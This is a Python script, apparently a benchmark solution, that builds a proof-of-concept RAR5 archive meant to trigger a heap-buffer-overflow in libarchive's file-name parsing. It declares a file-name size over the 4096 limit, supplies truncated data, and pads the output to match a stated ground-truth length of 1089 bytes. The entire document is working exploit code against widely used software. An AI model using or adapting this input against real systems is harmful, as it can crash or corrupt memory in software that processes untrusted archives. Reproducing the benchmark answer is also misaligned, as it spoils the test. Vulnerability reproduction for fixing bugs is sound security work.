class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        def to_vint(n: int) -> bytes:
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                byte = n & 0x7f
                n >>= 7
                if n > 0:
                    byte |= 0x80
                res.append(byte)
            return bytes(res)

        poc = bytearray()

        # RAR5 magic signature
        poc.extend(b'\x52\x61\x72\x21\x1a\x07\x01\x00')

        # The vulnerability is in the parsing of the file header in a RAR5 archive.
        # Specifically, the code reads the file name size, attempts to read that
        # many bytes for the file name, and only then validates if the size is
        # within the acceptable limit. By providing a size larger than the limit
        # and a truncated file (less data than the specified size), we can trigger
        # a heap-buffer-overflow when the code tries to process the file name,
        # as it will read past the end of the available data in the buffer.

        # Constants based on libarchive's RAR5 implementation
        MAXIMUM_RAR5_FILE_NAME_SIZE = 4096
        HEAD_FILE = 0x02

        # Choose a file name size that is larger than the allowed maximum.
        file_name_size = MAXIMUM_RAR5_FILE_NAME_SIZE + 1

        # Construct the file header fields. Most can be minimal (0).
        header_type = to_vint(HEAD_FILE)
        header_flags = to_vint(0)
        data_size = to_vint(0)
        file_flags = to_vint(0)
        unpacked_size = to_vint(0)
        file_attributes = to_vint(0)
        compression_info = to_vint(0)
        host_os = to_vint(0)
        file_name_size_vint = to_vint(file_name_size)

        # These fields follow the main header_size field.
        header_fields = (
            header_type +
            header_flags +
            data_size +
            file_flags +
            unpacked_size +
            file_attributes +
            compression_info +
            host_os +
            file_name_size_vint
        )

        # The header_size field itself specifies the size of all subsequent fields
        # in the header block, including the (very large) file name.
        header_size = len(header_fields) + file_name_size
        header_size_vint = to_vint(header_size)

        # Assemble the header block
        poc.extend(header_size_vint)
        poc.extend(header_fields)

        # Append the (truncated) file name data. To match the ground-truth PoC
        # length, we calculate the remaining bytes. This amount must be less
        # than `file_name_size` to ensure the file is considered truncated.
        ground_truth_len = 1089
        poc_header_len = len(poc)
        
        num_name_bytes = ground_truth_len - poc_header_len
        if num_name_bytes > 0:
            # The content doesn't matter, as long as it doesn't contain a null byte
            # which might terminate string operations prematurely.
            poc.extend(b'A' * num_name_bytes)

        return bytes(poc)